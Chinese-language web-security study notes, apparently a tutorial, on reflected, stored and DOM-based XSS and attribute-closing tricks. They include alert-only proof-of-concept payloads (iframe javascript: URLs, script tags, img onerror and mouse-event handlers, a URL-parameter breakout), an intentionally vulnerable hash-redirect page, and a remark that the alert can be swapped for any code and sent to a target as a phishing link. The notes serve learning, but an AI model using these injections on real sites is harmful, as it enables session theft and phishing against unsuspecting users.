# WEB攻防-XSS跨站&反射型&存储型&DOM型&标签闭合&输入输出&JS代码解析

![image-20251220160752424](images/image-20251220160752424.png)

![image-20251220160824351](images/image-20251220160824351.png)

## 嵌套网站 XSS反射型

模拟钓鱼把网站发给对方

常用标签：https://www.freebuf.com/articles/web/340080.html

```
<iframe src="javascript:alert(1)">test</iframe>
```

![image-20251220161046842](images/image-20251220161046842.png)

## 利用留言板测试 XSS存储型

```
<script>alert(1)</script>
```

![image-20251220161556072](images/image-20251220161556072.png)

只要浏览到这个界面就会出现弹窗 ==成功后可以修改你想要的代码==

![image-20251220161659220](images/image-20251220161659220.png)

## DOM-base型XSS

```
<html>
<head>
    <title>dom-xss-test</title>
    <script src="https://code.jquery.com/jquery-1.6.1.min.js"></script>
    <script>
        var hash = location.hash;
        if(hash){
            var url = hash.substring(1);
            location.href = url;
        }
    </script>
</head>
<body>
dom xss test.
</body>
</html>
```

![image-20251220163750862](images/image-20251220163750862.png)

## 模拟接收图片 闭合问题

![image-20251220165144261](images/image-20251220165144261.png)

![image-20251220165152631](images/image-20251220165152631.png)

当输入

![image-20251220165239340](images/image-20251220165239340.png)

无法正常显示==考虑闭合==

![image-20251220165252041](images/image-20251220165252041.png)

![image-20251220165257880](images/image-20251220165257880.png)

常用标签：https://www.freebuf.com/articles/web/340080.html

```
<img src=x onerror="alert(1)">
<img src=x onerror=eval("alert(1)")>
<img src=1 onmouseover="alert('xss');">
<img src=1 onmouseout="alert('xss');">
<img src=1 onclick="alert('xss');">
```

![image-20251220165442614](images/image-20251220165442614.png)

```
www.123.com/xss.php?x=x onerror="alert(1)">
```

成功弹窗

![image-20251220165456087](images/image-20251220165456087.png)